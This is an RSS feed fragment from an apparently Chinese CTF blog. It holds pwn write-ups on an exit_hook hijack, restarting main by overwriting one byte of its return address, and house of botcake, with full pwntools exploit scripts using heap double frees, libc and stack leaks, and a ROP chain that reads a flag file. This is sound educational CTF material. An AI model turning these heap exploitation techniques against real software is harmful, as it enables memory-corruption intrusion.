class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/newest_note&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line">local_libc = elf.libc.path</span><br><span class="line">libc=ELF(local_libc, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        b exit</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28866</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_leak</span>(<span class="params"><span class="built_in">bytes</span>=<span class="number">6</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">bytes</span> == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> u32(r(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> u64(r(<span class="built_in">bytes</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,content=<span class="string">b&#x27;aaaa&#x27;</span></span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    sla(<span class="string">&#x27;will be? :&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x20004200</span>))</span><br><span class="line">    show(<span class="number">293786</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    libc_base = get_leak() - <span class="number">0x218cc0</span></span><br><span class="line">    lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        add(i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line"></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    key = get_leak(<span class="number">5</span>)</span><br><span class="line">    heap_base = key &lt;&lt; <span class="number">12</span></span><br><span class="line">    lg(<span class="string">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class="line">    </span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    exit_hook = libc_base + <span class="number">0x21a6c0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(i)</span><br><span class="line">    add(<span class="number">10</span>,p64(exit_hook^key))</span><br><span class="line">    add(<span class="number">11</span>)</span><br><span class="line">    add(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">    og = [<span class="number">0xeeccc</span>, <span class="number">0xeeccf</span>, <span class="number">0xeecd2</span>]</span><br><span class="line">    og = og[<span class="number">0</span>] + libc_base</span><br><span class="line">    add(<span class="number">13</span>,p64(og)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    pause()</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/%E7%AC%94%E8%AE%B0/">笔记</category>
      
      
      <category domain="http://example.com/tags/exit-hook/">exit_hook</category>
      
      <category domain="http://example.com/tags/top-chunk/">top chunk</category>
      
      <category domain="http://example.com/tags/%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA/">整型溢出</category>
      
      
      <comments>http://example.com/2024/07/26/exit-hook%E5%8A%AB%E6%8C%81/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>关于修改mian返回地址一个字节可重新执行main函数的原理</title>
      <link>http://example.com/2024/07/26/%E5%85%B3%E4%BA%8E%E4%BF%AE%E6%94%B9mian%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E4%B8%80%E4%B8%AA%E5%AD%97%E8%8A%82%E5%8F%AF%E9%87%8D%E6%96%B0%E6%89%A7%E8%A1%8Cmain%E5%87%BD%E6%95%B0%E7%9A%84%E5%8E%9F%E7%90%86/</link>
      <guid>http://example.com/2024/07/26/%E5%85%B3%E4%BA%8E%E4%BF%AE%E6%94%B9mian%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E4%B8%80%E4%B8%AA%E5%AD%97%E8%8A%82%E5%8F%AF%E9%87%8D%E6%96%B0%E6%89%A7%E8%A1%8Cmain%E5%87%BD%E6%95%B0%E7%9A%84%E5%8E%9F%E7%90%86/</guid>
      <pubDate>Fri, 26 Jul 2024 04:55:01 GMT</pubDate>
      
      <description>&lt;p&gt;关于修改mian返回地址一个字节可重新执行main函数的原理&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>关于修改mian返回地址一个字节可重新执行main函数的原理</p><span id="more"></span><p>例题是 [ImaginaryCTF 2024] fermat</p><p>main函数的返回地址并不是像其他被main函数调用的返回地址一样返回程序内的某个地址，而是返回__libc_start_main </p><p>如下</p><p><img src="/imgs/$%7Bfiilename%7D/%E5%85%B3%E4%BA%8E%E4%BF%AE%E6%94%B9mian%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E4%B8%80%E4%B8%AA%E5%AD%97%E8%8A%82%E5%8F%AF%E9%87%8D%E6%96%B0%E6%89%A7%E8%A1%8Cmain%E5%87%BD%E6%95%B0%E7%9A%84%E5%8E%9F%E7%90%86-1.png"></p><p>然后在返回地址+0x10的地方保存着main函数的地址</p><p>在返回地址往上的低地址处存在着下面的这个函数，这个函数与__libc_start_main是挨着的，所以只需要修改__libc_start_main的一个字节即可劫持返回地址返回这个函数，关键的代码在于这个函数存在着这样一段汇编代码mov rax,[rsp+8];call rax</p><p><img src="/imgs/$%7Bfiilename%7D/%E5%85%B3%E4%BA%8E%E4%BF%AE%E6%94%B9mian%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E4%B8%80%E4%B8%AA%E5%AD%97%E8%8A%82%E5%8F%AF%E9%87%8D%E6%96%B0%E6%89%A7%E8%A1%8Cmain%E5%87%BD%E6%95%B0%E7%9A%84%E5%8E%9F%E7%90%86-2.png"></p><p>因此，我们试着将其最后的一个字节修改为\x89</p><p>在ret之后，rsp+8,那么此时[rsp+8]就刚好指向main函数的地址</p><p><img src="/imgs/$%7Bfiilename%7D/%E5%85%B3%E4%BA%8E%E4%BF%AE%E6%94%B9mian%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E4%B8%80%E4%B8%AA%E5%AD%97%E8%8A%82%E5%8F%AF%E9%87%8D%E6%96%B0%E6%89%A7%E8%A1%8Cmain%E5%87%BD%E6%95%B0%E7%9A%84%E5%8E%9F%E7%90%86-3.png"></p><p>mov rax,[rsp+8];call rax 之后，就能够返回main函数了</p><p><img src="/imgs/$%7Bfiilename%7D/%E5%85%B3%E4%BA%8E%E4%BF%AE%E6%94%B9mian%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E4%B8%80%E4%B8%AA%E5%AD%97%E8%8A%82%E5%8F%AF%E9%87%8D%E6%96%B0%E6%89%A7%E8%A1%8Cmain%E5%87%BD%E6%95%B0%E7%9A%84%E5%8E%9F%E7%90%86-4.png"></p>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/%E7%AC%94%E8%AE%B0/">笔记</category>
      
      
      <category domain="http://example.com/tags/libc-start-main/">__libc_start_main</category>
      
      
      <comments>http://example.com/2024/07/26/%E5%85%B3%E4%BA%8E%E4%BF%AE%E6%94%B9mian%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E4%B8%80%E4%B8%AA%E5%AD%97%E8%8A%82%E5%8F%AF%E9%87%8D%E6%96%B0%E6%89%A7%E8%A1%8Cmain%E5%87%BD%E6%95%B0%E7%9A%84%E5%8E%9F%E7%90%86/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>house of botcake</title>
      <link>http://example.com/2024/07/17/house-of-botcake/</link>
      <guid>http://example.com/2024/07/17/house-of-botcake/</guid>
      <pubDate>Wed, 17 Jul 2024 12:16:27 GMT</pubDate>
      
      <description>&lt;p&gt;高版本glibc下的 tcache double free 之 house of botcake&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>高版本glibc下的 tcache double free 之 house of botcake</p><span id="more"></span><p>例题为[CISCN 2022 华东北]blue</p><p>glibc 版本是 Ubuntu GLIBC 2.31-0ubuntu9.8</p><h3 id="house-of-botcake原理"><a href="#house-of-botcake原理" class="headerlink" title="house of botcake原理"></a>house of botcake原理</h3><p>申请9个大于 fastbin 的堆块，即大于0x78，前七个堆块用于填充tcache，这里为了避免和top chunk合并申请了10个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">0x80</span>) <span class="comment"># 0~9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)   <span class="comment"># 0~6</span></span><br></pre></td></tr></table></figure><p>第八个堆块作为prev，第九个堆块作为victim，释放victim，此时victim进入unsortbin，利用uaf可泄露libc地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p><img src="/imgs/$%7Bfiilename%7D/house%20of%20botcake-1.png"></p><p>释放prev与victim合并</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">7</span>)</span><br></pre></td></tr></table></figure><p><img src="/imgs/$%7Bfiilename%7D/house%20of%20botcake-2.png"></p><p>申请一个tcache腾出空间，再释放victim使其进入tcache，此时victim就存在于tcache和unsortbin了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p><img src="/imgs/$%7Bfiilename%7D/house%20of%20botcake-3.png"></p><p>然后我们只需再申请一个比 prev 大的堆块就可以修改到victim的指针了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pd = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x80</span> + p64(addr)</span><br><span class="line">add(<span class="number">0x90</span>,pd)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>house of botcake后，劫持stdout去leak environ，最后 orw 就可以了，write换成puts是因为write的rop太长了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line">local_libc = <span class="string">&#x27;/home/feichai/ctf_file/libc.so.6&#x27;</span></span><br><span class="line">libc=ELF(local_libc, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        b *$rebase(0x1498)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28685</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Choice: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">&#x27;aaaa&#x27;</span></span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):  <span class="comment"># only onces</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uaf</span>(<span class="params">idx</span>):   <span class="comment"># only onces</span></span><br><span class="line">    choice(<span class="number">666</span>)</span><br><span class="line">    sla(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        add(<span class="number">0x80</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    uaf(<span class="number">8</span>)  <span class="comment"># victim</span></span><br><span class="line">    show(<span class="number">8</span>)</span><br><span class="line">    libc_base = u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1ecbe0</span></span><br><span class="line">    lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">    environ = libc.sym[<span class="string">&quot;environ&quot;</span>] + libc_base</span><br><span class="line">    setcontext = libc.sym[<span class="string">&quot;setcontext&quot;</span>] + <span class="number">61</span> + libc_base</span><br><span class="line">    stdout = libc.sym[<span class="string">b&quot;_IO_2_1_stdout_&quot;</span>] + libc_base</span><br><span class="line">    lg(<span class="string">&#x27;stdout&#x27;</span>,stdout)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">7</span>) <span class="comment"># prev</span></span><br><span class="line">    add(<span class="number">0x80</span>) <span class="comment">#0</span></span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x70</span>) <span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x70</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(stdout)) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x80</span>) <span class="comment">#3</span></span><br><span class="line">    pd = p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(environ) + p64(environ+<span class="number">8</span>)*<span class="number">2</span></span><br><span class="line">    add(<span class="number">0x80</span>,pd) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">    stack = u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    lg(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line">    ret_addr = stack - <span class="number">0x120</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    pd = p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(ret_addr - <span class="number">8</span>)</span><br><span class="line">    add(<span class="number">0x70</span>,pd)</span><br><span class="line">    </span><br><span class="line">    pop_rdi = <span class="number">0x0000000000023b6a</span> + libc_base</span><br><span class="line">    pop_rsi = <span class="number">0x000000000002601f</span> + libc_base</span><br><span class="line">    pop_rdx = <span class="number">0x0000000000142c92</span> + libc_base</span><br><span class="line">    pop_rax = <span class="number">0x0000000000036174</span> + libc_base</span><br><span class="line">    ret = <span class="number">0x0000000000022679</span> + libc_base</span><br><span class="line">    <span class="built_in">open</span> = libc.sym[<span class="string">&quot;open&quot;</span>] + libc_base</span><br><span class="line">    read = libc.sym[<span class="string">&quot;read&quot;</span>] + libc_base</span><br><span class="line">    write = libc.sym[<span class="string">&quot;write&quot;</span>] + libc_base</span><br><span class="line">    puts = libc.sym[<span class="string">&quot;puts&quot;</span>] + libc_base</span><br><span class="line">    flag = ret_addr-<span class="number">8</span></span><br><span class="line">    </span><br><span class="line">    orw = <span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">    orw += p64(pop_rdi) + p64(flag)</span><br><span class="line">    orw += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">    orw += p64(<span class="built_in">open</span>)</span><br><span class="line"></span><br><span class="line">    orw += p64(pop_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">    orw += p64(pop_rsi) + p64(ret_addr+<span class="number">0x200</span>)</span><br><span class="line">    orw += p64(pop_rdx) + p64(<span class="number">0x50</span>)</span><br><span class="line">    orw += p64(read)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># orw += p64(pop_rdi) + p64(1)</span></span><br><span class="line">    <span class="comment"># orw += p64(pop_rsi) + p64(ret_addr+0x200)</span></span><br><span class="line">    <span class="comment"># orw += p64(pop_rdx) + p64(0x30)</span></span><br><span class="line">    <span class="comment"># orw += p64(write)</span></span><br><span class="line"></span><br><span class="line">    orw += p64(pop_rdi) + p64(ret_addr+<span class="number">0x200</span>)</span><br><span class="line">    orw += p64(puts)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x80</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    add(<span class="number">0x80</span>,orw)</span><br><span class="line">    </span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/%E7%AC%94%E8%AE%B0/">笔记</category>
      
      
      <category domain="http://example.com/tags/house-of-botcake/">house of botcake</category>
      
      <category domain="http://example.com/tags/orw/">orw</category>
      
      <category domain="http://example.com/tags/environ/">environ</category>
      
      <category domain="http://example.com/tags/io-file/">io_file</category>
      
      
      <comments>http://example.com/2024/07/17/house-of-botcake/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>初识setcontext</title>
      <link>http://example.com/2024/07/09/%E5%88%9D%E8%AF%86setcontext/</link>
      <guid>http://example.com/2024/07/09/%E5%88%9D%E8%AF%86setcontext/</guid>
      <pubDate>Tue, 09 Jul 2024 08:35:11 GMT</pubDate>
      
      <description>&lt;p&gt;glibc2.27版本下的setcontext入门&lt;/p&gt;</description>
      
      
      
